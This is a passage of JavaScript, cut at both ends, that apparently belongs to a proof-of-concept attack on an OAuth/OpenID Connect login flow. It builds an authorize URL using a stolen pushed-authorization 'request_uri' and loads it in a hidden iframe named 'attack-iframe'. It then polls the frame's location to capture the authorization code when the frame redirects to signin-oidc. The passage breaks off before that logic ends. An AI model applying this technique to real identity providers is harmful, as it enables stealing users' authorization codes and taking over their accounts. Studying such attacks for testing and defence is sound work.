        authorizeUrl.searchParams.set('client_id', 'dpop');
        authorizeUrl.searchParams.set('request_uri', stolenRequestUri);
        
        // Create hidden iframe
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.id = 'attack-iframe';
        
        // Monitor iframe for redirect with authorization code
        let checkCount = 0;
        const checkInterval = setInterval(() => {
            try {
                const iframeUrl = iframe.contentWindow.location.href;
                
                // Check if we got redirected to signin-oidc with code
